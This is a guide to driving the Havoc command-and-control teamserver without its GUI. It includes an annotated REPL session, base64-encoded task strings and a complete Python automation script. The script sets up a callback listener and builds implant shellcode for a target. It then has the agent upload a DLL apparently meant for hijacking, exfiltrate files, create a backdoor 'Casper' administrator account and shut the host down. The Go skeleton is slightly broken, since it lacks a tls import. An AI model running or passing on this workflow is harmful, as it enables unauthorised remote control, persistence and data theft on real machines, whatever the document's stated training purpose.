# Building a Headless Havoc Client in Go

This guide explains how to replace the Qt-based GUI client with a custom headless client written in Go. It summarises the network protocol used between the existing client and the Havoc teamserver and outlines a reference architecture for interacting with the teamserver programmatically.

## Using the bundled headless client

The repository now includes a ready-to-run CLI client under the `headless` subcommand of the teamserver binary. Build the Go project and connect to a running teamserver instance:

```bash
cd teamserver
go build -o havoc
./havoc headless --host 127.0.0.1 --port 40056 --user operator --password "super-secret"
```

> **Tip:** Always run Go tooling from inside the `teamserver/` module. Invocations from the repository root will error with `go: cannot find main module` because the Go sources live beneath `teamserver/`.

Authentication also honours the `HAVOC_PASSWORD` environment variable, so you can omit `--password` and export the secret instead. The `--insecure=false` flag enables strict TLS verification, and `--no-prompt` starts the client in log-only mode without the interactive REPL. 【F:teamserver/cmd/headless/headless.go†L39-L118】

After a successful login you will land in a prompt that mirrors core GUI actions:

```text
Headless Havoc client ready. Type 'help' for a list of commands.
> listeners
NAME            PROTOCOL   BIND        PORT   HOSTS        STATUS   UPDATED
redirector      https      0.0.0.0     443    teamserver   RUNNING  2024-04-03T12:17:03Z
> agents
ID        USER@HOST        INTERNAL        EXTERNAL        PROCESS      PID   ARCH   SLEEP   STATUS
AGT0213   user@workstn     10.0.4.23       203.0.113.42    explorer.exe 1044  x64    30s     Alive
> chat Testing headless client
> task AGT0213 12 FromProcessManager=false
queued command 12 for agent AGT0213 (task 5b8f3a60)
> task AGT0213 0x1010 shell whoami ProcCommand=4 Args=0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;L2Mgd2hvYW1p
queued command 0x1010 for agent AGT0213 (task 3a21d91c)
> task AGT0213 2510 one-time
queued command 2510 for agent AGT0213 (task 181c0e24)
> mark AGT0213 Dead
```

* `listeners`, `agents`, and `chatlog` render cached state the reader thread maintains for you. 【F:teamserver/cmd/headless/headless.go†L421-L481】
* `chat <message>` broadcasts a base64-encoded message to every operator session. 【F:teamserver/cmd/headless/headless.go†L489-L512】
* `task <agent-id> <command-id> ...` submits work to the selected agent. Tokens without an equals sign become the `CommandLine` string while `key=value` pairs populate explicit fields in the package payload. Add the literal `one-time` token when you want the teamserver to treat the task as transient output. The client automatically supplies the `FromProcessManager=false` flag that the GUI always includes with process listings, so you only need to override it when queueing tasks from the process manager UI. 【F:teamserver/cmd/headless/headless.go†L514-L615】
* `mark <agent-id> <Alive|Dead>` updates the agent’s status flag in Havoc. 【F:teamserver/cmd/headless/headless.go†L571-L603】

Command identifiers line up with the constants in [`teamserver/pkg/agent/commands.go`](../teamserver/pkg/agent/commands.go). For example, `12` invokes `COMMAND_PROC_LIST` while `2510` triggers `COMMAND_SCREENSHOT`. Combine those values with sub-command key/value pairs (e.g. `SubCommand=1`) to reach deeper capabilities.

When replicating higher-level console actions (such as `shell`), translate the Qt client’s payloads before sending them. The GUI wraps shell execution inside the process module, so you need to send both the numeric process command and the encoded arguments:

```text
> task AGT0213 0x1010 shell whoami ProcCommand=4 Args=0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;L2Mgd2hvYW1p
```

That format mirrors `CommandExecute::ProcModule` inside the Qt source. `ProcCommand=4` selects the “create process” branch and the trailing base64 value (`L2Mgd2hvYW1p`) is the encoded `/c whoami` argument block that the demon expects. Use the other helpers in `client/src/Havoc/Demon/CommandSend.cc` as a reference when you script additional task types. 【F:client/src/Havoc/Demon/ConsoleInput.cc†L856-L877】【F:client/src/Havoc/Demon/CommandSend.cc†L284-L315】

## Common command translations

The Qt console also hides a fair amount of bookkeeping when it fires Python modules or file-system helpers. The headless CLI can reproduce the same behaviour, but you must expand the high-level command into the raw task payload yourself. Replace `<agent-id>` with the demon identifier shown by the `agents` command.

### PowerShell one-liners

Use the process module (`CommandID 0x1010`) with `ProcCommand=4`. The `Args` field must contain the literal string `0;FALSE;TRUE;` followed by the PowerShell path and a base64-encoded command line. The examples below mirror the Qt client’s `powershell` helper.

```text
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiTWFjaGluZSIp
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiVXNlciIp
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgU3RvcC1Db21wdXRlcg==
```

The three commands above retrieve the machine `PATH`, the user `PATH`, and issue `Stop-Computer`, respectively.

### File uploads and downloads

File operations use `CommandID 15` (`COMMAND_FS`). Supply a `SubCommand` string and the encoded `Arguments` value that the demon expects. Paths are UTF-8 strings encoded with base64, matching the GUI implementation in `CommandExecute::FS` and the server-side translation in `teamserver/pkg/agent/demons.go`.

```text
# Upload local DLL to %LOCALAPPDATA%\Temp
task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxXcHRzRXh0ZW5zaW9ucy5kbGw=<base64-data>

# Upload local EXE to %LOCALAPPDATA%\Temp
task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxzdW1tb24uZXhl<base64-data>

# Download individual files from C:\
task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2FtYW50aGEudHh0
task <agent-id> 15 download SubCommand=download Arguments=Qzpcc3lzdGVtaWMudHh0
task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2VjdXJpdHkudHh0
```

Replace `<base64-data>` with the base64-encoded contents of the file you want to upload (for example, `base64 -w0 /home/kali/WptsExtensions.dll`). When you queue a download the server streams the file back through the standard transfer channel, exactly as if you had used the GUI.

### Local account management

The GUI wraps module logic around simple PowerShell or `net.exe` commands. From the headless client you can reuse the PowerShell pattern from above to create a user and add it to the Administrators group. For example:

```text
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IHVzZXIgQ2FzcGVyIElhbUFHaG9zdDEyMzQ1ISEhIC9hZGQ=
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgQ2FzcGVyIC9hZGQ=
```

These two tasks create the `Casper` account with the provided password and add it to the local Administrators group. Swap in any other account-management one-liners you prefer (for example `New-LocalUser` / `Add-LocalGroupMember`).

### About Python modules

Qt modules such as `samdump` run inside the GUI process and emit whatever low-level tasks the demon needs. The headless CLI does not embed the Python runtime, so module commands are unavailable unless you port their implementation into your automation. Use the C++ helpers referenced above to see which raw tasks a given module sends before recreating it in Go, Python, or another scripting language.

## Provisioning listeners and payloads

### Create listeners programmatically

The Qt client populates the `Listener.Add` payload with the same key/value pairs the dialog collects (name, bind address, host rotation, ports, proxy settings, and headers).【F:client/src/UserInterface/Dialogs/Listener.cc†L618-L697】 When the teamserver receives that package it persists the handler configuration and broadcasts the listener summary back to every client.【F:teamserver/cmd/server/listener.go†L220-L332】 The headless client can synthesise that exact package before it requests an agent build:

```json
{
  "Head": {
    "Event": 2,
    "User": "Neo",
    "Time": "06/10/2025 14:55:00"
  },
  "Body": {
    "SubEvent": 1,
    "Info": {
      "Name": "training-http",
      "Protocol": "HTTP",
      "Status": "online",
      "Secure": "false",
      "Hosts": "0.0.0.0",
      "HostBind": "0.0.0.0",
      "HostRotation": "Round-Robin",
      "PortBind": "8443",
      "PortConn": "8443",
      "Headers": "Server: training",
      "Uris": "/,/health",
      "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      "HostHeader": "training.local",
      "Proxy Enabled": "false"
    }
  }
}
```

Send the JSON over the WebSocket as soon as authentication succeeds. Monitor `packager.Type.Listener.Add` responses to confirm the handler reports `Status == "Online"` before building payloads.

### Request stageless shellcode builds

The payload generator dialog wraps the same `Gate.Stageless` request you need for a headless workflow: the `Head` marks the message as one-time, and the `Body.Info` collection specifies the agent type, listener, output format, and JSON-encoded demon configuration.【F:client/src/UserInterface/Dialogs/Payload.cc†L220-L247】 The dispatcher unmarshals that JSON, selects the listener, and invokes the native builder before returning a `Gate.Stageless` package that contains the compiled bytes in `PayloadArray`.【F:teamserver/cmd/server/dispatch.go†L821-L925】【F:teamserver/pkg/events/gate.go†L12-L27】

A minimal shellcode request therefore looks like:

```json
{
  "Head": {
    "Event": 5,
    "User": "Neo",
    "Time": "06/10/2025 14:55:02",
    "OneTime": "true"
  },
  "Body": {
    "SubEvent": 2,
    "Info": {
      "AgentType": "Demon",
      "Listener": "training-http",
      "Arch": "x64",
      "Format": "Windows Shellcode",
      "Config": "{\"Sleep\":\"5\",\"Jitter\":\"15\",\"Injection\":{\"Alloc\":\"Win32\",\"Execute\":\"Win32\",\"Spawn64\":\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\"Spawn32\":\"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"}}"
    }
  }
}
```

Reuse the profile document broadcast during the login handshake (`packager.Type.InitConnection.Profile`) to seed the `Config` string so the builder receives the same defaults as the Qt client.【F:teamserver/pkg/events/events.go†L120-L138】 After the response arrives, base64-decode `PayloadArray` and persist it as the shellcode blob you will execute on the target host.

## Automating sequential workflows

The interactive REPL is convenient for ad-hoc operations, but training exercises usually need a deterministic workflow that provisions infrastructure, delivers an implant, and then executes operator commands in order. The headless protocol exposes everything required to orchestrate that sequence:

1. Connect to the teamserver, authenticate, and collect the cached profile document you will reuse during payload builds.【F:teamserver/cmd/headless/headless.go†L31-L115】【F:teamserver/pkg/events/events.go†L120-L138】
2. Add or update the listener you want to use for the engagement and wait until the server reports it as `Online`.【F:teamserver/cmd/server/listener.go†L220-L332】
3. Submit a `Gate.Stageless` build request that references that listener, save the returned shellcode, and execute it on the target host.【F:client/src/UserInterface/Dialogs/Payload.cc†L220-L247】【F:teamserver/cmd/server/dispatch.go†L821-L925】
4. Track the set of agent IDs that existed before the payload ran so you can recognise the new session when it checks in.【F:teamserver/pkg/events/demons.go†L17-L66】
5. Queue the desired commands one at a time, writing console output to disk and decoding download callbacks before scheduling the next task.【F:teamserver/pkg/service/service.go†L360-L418】

The Python script below implements that end-to-end workflow. It provisions an HTTP listener, requests a stageless x64 shellcode payload, saves the payload to `artifacts/demon.x64.bin`, waits for the new agent created by executing that shellcode, and then runs the command sequence discussed earlier. PowerShell output for the PATH queries is written to disk, uploads and downloads are mirrored to the `artifacts/` directory, and the local account creation commands are queued before `Stop-Computer` is issued as the final step. Module shortcuts such as `samdump` still require porting the Qt module logic into your automation before you can add them to the queue.

```python
#!/usr/bin/env python3
import asyncio
import base64
import hashlib
import json
import os
import pathlib
import ssl
from datetime import datetime

import websockets

TEAMSERVER = "wss://127.0.0.1:40056/havoc/"
USERNAME = "operator"
PASSWORD = "super-secret"

LISTENER_NAME = "training-http"
LISTENER_BIND = "0.0.0.0"
LISTENER_PORT = 8443
LISTENER_HOSTS = ["0.0.0.0"]

ARTIFACT_DIR = pathlib.Path("artifacts")
SHELLCODE_PATH = ARTIFACT_DIR / "demon.x64.bin"

LOCAL_DLL = pathlib.Path("/home/kali/WptsExtensions.dll")
LOCAL_EXE = pathlib.Path("/home/kali/summon.exe")
REMOTE_DLL = r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\WptsExtensions.dll"
REMOTE_EXE = r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\summon.exe"

INIT_TYPE = 0x1
INIT_SUCCESS = 0x1
INIT_ERROR = 0x2
INIT_OAUTH = 0x3
INIT_PROFILE = 0x5
LISTENER_TYPE = 0x2
LISTENER_ADD = 0x1
LISTENER_ERROR = 0x5
SESSION_TYPE = 0x7
SESSION_NEW = 0x1
SESSION_INPUT = 0x3
SESSION_OUTPUT = 0x4
GATE_TYPE = 0x5
GATE_STAGELESS = 0x2


def timestamp():
    return datetime.utcnow().strftime("%m/%d/%Y %H:%M:%S")


def sha3(password):
    return hashlib.sha3_256(password.encode()).hexdigest()


def b64(data):
    return base64.b64encode(data).decode()


def read_file_b64(path):
    data = path.expanduser().read_bytes()
    return b64(data)


def make_package(event, subevent, info, *, user=USERNAME, one_time=False):
    head = {"Event": event, "User": user, "Time": timestamp()}
    if one_time:
        head["OneTime"] = "true"
    return {"Head": head, "Body": {"SubEvent": subevent, "Info": info}}


def make_task(agent_id, command_id, command_line, **fields):
    task_id = os.urandom(4).hex()
    info = {
        "TaskID": task_id,
        "DemonID": agent_id,
        "CommandID": str(command_id),
        "CommandLine": command_line,
    }
    info.update(fields)
    return task_id, make_package(SESSION_TYPE, SESSION_INPUT, info)


def encode_ps(command):
    return (
        "0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
        + b64(command.encode())
    )


def encode_path(path):
    return b64(path.encode("utf-8"))


async def authenticate(ws):
    request = make_package(
        INIT_TYPE,
        INIT_OAUTH,
        {"User": USERNAME, "Password": sha3(PASSWORD)},
    )
    await ws.send(json.dumps(request))


def listener_payload():
    hosts = ", ".join(LISTENER_HOSTS)
    info = {
        "Name": LISTENER_NAME,
        "Protocol": "HTTP",
        "Status": "online",
        "Secure": "false",
        "Hosts": hosts,
        "HostBind": LISTENER_BIND,
        "HostRotation": "Round-Robin",
        "PortBind": str(LISTENER_PORT),
        "PortConn": str(LISTENER_PORT),
        "Headers": "Server: training",
        "Uris": "/,/health",
        "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "HostHeader": "training.local",
        "Proxy Enabled": "false",
    }
    return make_package(LISTENER_TYPE, LISTENER_ADD, info)


def gate_payload(config_json):
    info = {
        "AgentType": "Demon",
        "Listener": LISTENER_NAME,
        "Arch": "x64",
        "Format": "Windows Shellcode",
        "Config": config_json,
    }
    return make_package(GATE_TYPE, GATE_STAGELESS, info, one_time=True)


def build_workflow(agent_id):
    steps = []

    def append_step(name, payload, **extras):
        step = {
            "name": name,
            "payload": payload,
            "command_id": payload["Body"]["Info"]["CommandID"],
            "task_id": payload["Body"]["Info"]["TaskID"],
        }
        step.update(extras)
        steps.append(step)

    _, payload = make_task(
        agent_id,
        0x1010,
        "powershell [System.Environment]::GetEnvironmentVariable('Path','Machine')",
        ProcCommand="4",
        Args=encode_ps("[System.Environment]::GetEnvironmentVariable('Path','Machine')"),
    )
    append_step("machine_path", payload, outfile=ARTIFACT_DIR / "machine-path.txt")

    _, payload = make_task(
        agent_id,
        0x1010,
        "powershell [System.Environment]::GetEnvironmentVariable('Path','User')",
        ProcCommand="4",
        Args=encode_ps("[System.Environment]::GetEnvironmentVariable('Path','User')"),
    )
    append_step("user_path", payload, outfile=ARTIFACT_DIR / "user-path.txt")

    _, payload = make_task(
        agent_id,
        15,
        f"upload {LOCAL_DLL} {REMOTE_DLL}",
        SubCommand="upload",
        Arguments=encode_path(REMOTE_DLL),
        File=read_file_b64(LOCAL_DLL),
    )
    append_step("upload_wpts", payload)

    _, payload = make_task(
        agent_id,
        15,
        f"upload {LOCAL_EXE} {REMOTE_EXE}",
        SubCommand="upload",
        Arguments=encode_path(REMOTE_EXE),
        File=read_file_b64(LOCAL_EXE),
    )
    append_step("upload_summon", payload)

    for name, remote in [
        ("download_samantha", r"C:\\samantha.txt"),
        ("download_systemic", r"C:\\systemic.txt"),
        ("download_security", r"C:\\security.txt"),
    ]:
        _, payload = make_task(
            agent_id,
            15,
            f"download {remote}",
            SubCommand="download",
            Arguments=encode_path(remote),
        )
        append_step(name, payload, download=remote)

    _, payload = make_task(
        agent_id,
        0x1010,
        "powershell net user Casper IamAGhost12345!!! /add",
        ProcCommand="4",
        Args=encode_ps("net user Casper IamAGhost12345!!! /add"),
    )
    append_step("add_user", payload)

    _, payload = make_task(
        agent_id,
        0x1010,
        "powershell net localgroup Administrators Casper /add",
        ProcCommand="4",
        Args=encode_ps("net localgroup Administrators Casper /add"),
    )
    append_step("add_to_admins", payload)

    _, payload = make_task(
        agent_id,
        0x1010,
        "powershell Stop-Computer",
        ProcCommand="4",
        Args=encode_ps("Stop-Computer"),
    )
    append_step("stop_computer", payload, expect_output=False)

    return steps


async def workflow_runner():
    ARTIFACT_DIR.mkdir(parents=True, exist_ok=True)

    ssl_context = None
    if TEAMSERVER.startswith("wss://"):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

    async with websockets.connect(TEAMSERVER, ssl=ssl_context) as ws:
        await authenticate(ws)

        listener_sent = False
        listener_ready = False
        payload_requested = False
        payload_saved = False
        profile_json = ""
        seen_agents = set()
        baseline_agents = set()
        agent_id = None
        workflow = []
        current_step = None
        workflow_done = False

        async def maybe_queue_next():
            nonlocal current_step, workflow_done
            while agent_id and not current_step and workflow:
                current_step = workflow.pop(0)
                package = current_step["payload"]
                package["Head"]["Time"] = timestamp()
                command_line = package["Body"]["Info"].get("CommandLine", "")
                print(f"[>] queued {current_step['name']}: {command_line}")
                await ws.send(json.dumps(package))
                if not current_step.get("expect_output", True):
                    print(f"[!] {current_step['name']} does not return output; continuing")
                    current_step = None
                    continue
            if agent_id and not workflow and current_step is None and not workflow_done:
                workflow_done = True
                print("[*] command workflow finished")

        while True:
            message = json.loads(await ws.recv())
            head = message.get("Head", {})
            body = message.get("Body", {})
            event = head.get("Event")
            subevent = body.get("SubEvent")
            info = body.get("Info", {})

            if event == INIT_TYPE:
                if subevent == INIT_SUCCESS:
                    print(f"[+] authenticated as {USERNAME}")
                    if not listener_sent:
                        pkg = listener_payload()
                        pkg["Head"]["Time"] = timestamp()
                        await ws.send(json.dumps(pkg))
                        listener_sent = True
                        print(f"[>] requested listener {LISTENER_NAME}")
                elif subevent == INIT_ERROR:
                    print(f"[-] authentication failed: {info.get('Message', 'unknown error')}")
                    return
                elif subevent == INIT_PROFILE:
                    profile_json = info.get("Demon", "")
                    print(f"[+] received profile template ({len(profile_json)} bytes)")
                    if listener_ready and not payload_requested:
                        pkg = gate_payload(profile_json)
                        pkg["Head"]["Time"] = timestamp()
                        await ws.send(json.dumps(pkg))
                        payload_requested = True
                        print("[>] requested shellcode build")
            elif event == LISTENER_TYPE:
                name = info.get("Name") or info.get("ListenerName")
                status = info.get("Status", "")
                if subevent == LISTENER_ADD and name == LISTENER_NAME:
                    print(f"[+] listener {name} -> {status}")
                    if status.lower() == "online":
                        listener_ready = True
                        if profile_json and not payload_requested:
                            pkg = gate_payload(profile_json)
                            pkg["Head"]["Time"] = timestamp()
                            await ws.send(json.dumps(pkg))
                            payload_requested = True
                            print("[>] requested shellcode build")
                elif subevent == LISTENER_ERROR and name == LISTENER_NAME:
                    print(f"[-] listener error: {info.get('Error', 'unknown error')}")
            elif event == GATE_TYPE and subevent == GATE_STAGELESS:
                if "PayloadArray" in info:
                    data = base64.b64decode(info["PayloadArray"])
                    SHELLCODE_PATH.parent.mkdir(parents=True, exist_ok=True)
                    SHELLCODE_PATH.write_bytes(data)
                    payload_saved = True
                    baseline_agents = set(seen_agents)
                    print(f"[+] saved shellcode to {SHELLCODE_PATH} ({len(data)} bytes)")
                    print("[*] execute the payload on the target to register a new agent")
                elif "Message" in info:
                    print(f"[builder] {info.get('MessageType', 'Info')}: {info['Message']}")
            elif event == SESSION_TYPE:
                if subevent == SESSION_NEW:
                    name = info.get("NameID")
                    if name:
                        seen_agents.add(name)
                        if payload_saved and agent_id is None and name not in baseline_agents:
                            agent_id = name
                            print(f"[+] new agent registered: {agent_id}")
                            workflow = build_workflow(agent_id)
                            await maybe_queue_next()
                elif subevent == SESSION_OUTPUT and agent_id and info.get("DemonID") == agent_id:
                    if not current_step or info.get("CommandID") != current_step["command_id"]:
                        continue

                    output_data = base64.b64decode(info.get("Output", ""))
                    text = output_data.decode("utf-8", errors="ignore")

                    if current_step.get("download"):
                        try:
                            callback = json.loads(text)
                        except json.JSONDecodeError:
                            if text.strip():
                                print(f"[{current_step['name']}] {text.strip()}")
                            continue

                        if callback.get("MiscType") == "download" and "MiscData" in callback:
                            content = base64.b64decode(callback["MiscData"])
                            remote_name_b64 = callback.get("MiscData2", "").split(";", 1)[0]
                            if remote_name_b64:
                                remote_name = base64.b64decode(remote_name_b64).decode("utf-8", errors="ignore")
                            else:
                                remote_name = current_step["download"]
                            out_path = ARTIFACT_DIR / pathlib.Path(remote_name).name
                            out_path.write_bytes(content)
                            print(f"[+] downloaded {remote_name} -> {out_path}")
                            current_step = None
                            await maybe_queue_next()
                        else:
                            if "Message" in callback:
                                print(f"[{current_step['name']}] {callback['Message']}")
                    else:
                        if current_step.get("outfile"):
                            current_step["outfile"].parent.mkdir(parents=True, exist_ok=True)
                            current_step["outfile"].write_text(text, encoding="utf-8")
                            print(f"[+] wrote output to {current_step['outfile']}")
                        elif text.strip():
                            try:
                                structured = json.loads(text)
                            except json.JSONDecodeError:
                                print(f"[{current_step['name']}] {text.strip()}")
                            else:
                                if "Message" in structured:
                                    print(f"[{current_step['name']}] {structured['Message']}")
                                else:
                                    print(f"[{current_step['name']}] {text.strip()}")
                        current_step = None
                        await maybe_queue_next()

            if workflow_done:
                break


async def main():
    try:
        await workflow_runner()
    except FileNotFoundError as exc:
        print(f"[-] required file not found: {exc.filename}")


if __name__ == "__main__":
    asyncio.run(main())
```

Update the constants at the top of the script for your environment (teamserver URI, credentials, listener settings, and local file paths). The download handler writes the retrieved files alongside the other artefacts so you can distribute them with the training materials. Because the loop waits for each `Session.Output` package before moving forward, the agent never has more than one outstanding command and you get deterministic logs of every action.【F:teamserver/pkg/events/demons.go†L17-L66】【F:teamserver/pkg/service/service.go†L360-L418】

## 1. Understand the Transport

* The Qt client connects to the teamserver over a WebSocket endpoint at `wss://<host>:<port>/havoc/` and ignores TLS validation errors. The same URI and TLS behaviour must be reproduced by the headless client. 【F:client/src/Havoc/Connector.cc†L10-L44】
* Messages are sent as binary WebSocket frames that contain JSON payloads. The JSON documents always wrap a `Head` and `Body` object that together form a `Package`. 【F:client/src/Havoc/Connector.cc†L19-L32】【F:client/src/Havoc/Packager.cc†L64-L106】

The Go client can reuse [`gorilla/websocket`](https://github.com/gorilla/websocket) for the transport layer. Use `tls.Config{InsecureSkipVerify: true}` if you need to replicate the GUI client’s decision to ignore certificate issues.

## 2. Reuse the Packager Types

The teamserver already defines Go structs for packages and the enumerations for all message types and sub-events. Instead of hard-coding constants, import or vendor the `teamserver/pkg/packager` module so the headless client can reuse `packager.Head`, `packager.Body`, and the `packager.Type` lookup table. 【F:teamserver/pkg/packager/types.go†L1-L135】

Each outbound and inbound message is modelled as:

```go
type Package struct {
    Head packager.Head `json:"Head"`
    Body packager.Body `json:"Body"`
}
```

The `Head.Event` number selects the high-level channel (listeners, sessions, chat, etc.) and `Body.SubEvent` picks the specific action.

## 3. Authenticate With the Teamserver

The login handshake uses a single package:

1. Set `Head.Event` to `packager.Type.InitConnection.Type`.
2. Set `Body.SubEvent` to `packager.Type.InitConnection.OAuthRequest`.
3. Place the operator username in both `Head.User` and `Body.Info["User"]`.
4. Hash the clear-text password with SHA3-256 and hex-encode it, then store the result in `Body.Info["Password"]`. 【F:client/src/Havoc/Connector.cc†L48-L69】【F:teamserver/cmd/server/teamserver.go†L560-L627】

On success the server replies with `InitConnection.Success` (SubEvent `0x1`), followed by a stream of cached events and profile information so the client can reconstruct state. 【F:teamserver/pkg/events/events.go†L18-L69】

## 4. Consume Server Events

After authentication the teamserver continuously emits events to describe listeners, chat messages, operator presence, agents (“demons”), and build settings. These packages follow the same `Head`/`Body` layout. Key examples include:

* Listener lifecycle notifications (`Event == packager.Type.Listener.Type`). The payload mirrors the handler configuration, so decoding into a generic map suffices. 【F:teamserver/pkg/events/listeners.go†L13-L120】
* Agent session events (`Event == packager.Type.Session.Type`) for new implants, console output, status changes, and task results. 【F:teamserver/pkg/events/demons.go†L17-L86】
* Teamserver logs and profile data (`Event == packager.Type.Teamserver.Type`). 【F:teamserver/pkg/events/teamserver.go†L1-L88】

Store these packages in-memory to maintain headless state (active agents, available listeners, pending tasks) in the same way as the GUI client’s tabs do.

## 5. Send Operator Actions

To task agents or manage listeners the client sends packages back to the server. The dispatcher in the teamserver shows the payloads it expects for each action:

* **Task an agent:**
  * Use `Event == packager.Type.Session.Type` and `SubEvent == packager.Type.Session.Input`.
  * Set `Body.Info["DemonID"]` to the agent’s `NameID` and `Body.Info["CommandID"]` to the numeric command string (e.g. `"1"` for `shell`).
  * Include command-specific arguments in `Body.Info` (for example `"CommandLine"`).
  * Optional: set `Head.OneTime = "true"` for transient jobs such as console-only messages. 【F:teamserver/cmd/server/dispatch.go†L22-L158】

* **Mark an agent:** send `SubEvent == packager.Type.Session.MarkAsDead` with `Body.Info["AgentID"]` and `Body.Info["Marked"]`. 【F:teamserver/pkg/events/demons.go†L88-L110】

* **Add or edit listeners:** reuse the same payloads that the server broadcasts for listener events; the dispatcher will forward them into the handler subsystem. 【F:teamserver/pkg/events/listeners.go†L13-L120】【F:teamserver/cmd/server/dispatch.go†L160-L252】

When broadcasting operator chat messages or status changes, mirror the structures emitted by the GUI client (`Event == packager.Type.Chat.Type`).

## 6. Reference Go Skeleton

The following skeleton shows the control flow for a minimal headless client:

```go
package main

import (
    "crypto/sha3"
    "encoding/hex"
    "log"
    "net/url"
    "time"

    "github.com/gorilla/websocket"

    "Havoc/teamserver/pkg/packager"
)

func main() {
    dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
    u := url.URL{Scheme: "wss", Host: "teamserver:40056", Path: "/havoc/"}

    conn, _, err := dialer.Dial(u.String(), nil)
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    passHash := sha3.Sum256([]byte("operator-password"))
    login := packager.Package{
        Head: packager.Head{
            Event: packager.Type.InitConnection.Type,
            User:  "operator",
            Time:  time.Now().Format("02/01/2006 15:04:05"),
        },
        Body: packager.Body{
            SubEvent: packager.Type.InitConnection.OAuthRequest,
            Info: map[string]any{
                "User":     "operator",
                "Password": hex.EncodeToString(passHash[:]),
            },
        },
    }

    if err := conn.WriteJSON(login); err != nil {
        log.Fatal(err)
    }

    for {
        var pk packager.Package
        if err := conn.ReadJSON(&pk); err != nil {
            log.Fatal(err)
        }

        // TODO: dispatch on pk.Head.Event / pk.Body.SubEvent
    }
}
```

Replace the `TODO` block with handlers that update your headless state machine and trigger actions. For outgoing messages, fill `packager.Package` values and call `conn.WriteJSON` or `conn.WriteMessage(websocket.BinaryMessage, ...)` as required.

## 7. Optional Enhancements

* Persist the current state to disk so reconnects can replay pending jobs before the server’s cached events arrive.
* Provide a CLI, REST, or gRPC layer on top of the core event loop so that other automation can drive Havoc without the GUI.
* Integrate operator authentication (e.g., environment variables or Vault) instead of storing hashed passwords on disk.

By mirroring the message flow captured above you can fully control the Havoc teamserver from Go without launching the Qt interface.
